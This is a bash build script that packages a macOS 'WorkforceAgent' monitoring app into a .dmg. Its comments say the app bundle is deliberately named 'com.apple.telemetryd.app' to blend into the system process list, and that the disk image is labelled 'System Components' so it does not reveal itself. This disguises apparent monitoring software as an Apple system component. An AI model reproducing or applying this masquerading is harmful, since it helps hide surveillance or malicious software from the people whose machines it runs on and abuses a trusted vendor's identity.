#!/usr/bin/env bash
# Build the macOS .app and package it into a distributable .dmg.
# The app bundle is named 'com.apple.telemetryd.app' to blend into the
# system process list and hide from the Applications folder's obvious name.
#
# Must run on macOS (uses sips/iconutil/hdiutil). Run from anywhere:
#   bash agent/packaging/macos/build_dmg.sh
set -euo pipefail

HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"   # agent/packaging/macos
PKG_DIR="$(dirname "$HERE")"                            # agent/packaging
cd "$PKG_DIR"

# 1. Build the .icns from the master PNG (macOS-only tooling).
ICONSET="icons/icon.iconset"
rm -rf "$ICONSET"
mkdir -p "$ICONSET"
for size in 16 32 64 128 256 512; do
  sips -z "$size" "$size" icons/icon.png --out "$ICONSET/icon_${size}x${size}.png" >/dev/null
  d=$((size * 2))
  sips -z "$d" "$d" icons/icon.png --out "$ICONSET/icon_${size}x${size}@2x.png" >/dev/null
done
iconutil -c icns "$ICONSET" -o icons/icon.icns

# 2. Build the .app bundle with PyInstaller.
#    WorkforceAgent.spec now names the bundle 'com.apple.telemetryd.app'.
pyinstaller --noconfirm WorkforceAgent.spec

# Bundle name must match BUNDLE_NAME in WorkforceAgent.spec
APP="dist/com.apple.telemetryd.app"
DMG="dist/WorkforceAgent-macos.dmg"
STAGE="dist/dmg-stage"

# 3. Package the .app into a compressed .dmg.
#    The volume name is kept generic so it doesn't reveal itself when mounted.
rm -f "$DMG"
rm -rf "$STAGE"
mkdir -p "$STAGE"
cp -R "$APP" "$STAGE/"
ln -s /Applications "$STAGE/Applications"

hdiutil create \
  -volname "System Components" \
  -srcfolder "$STAGE" \
  -ov -format UDZO \
  "$DMG"

echo "Built $DMG"
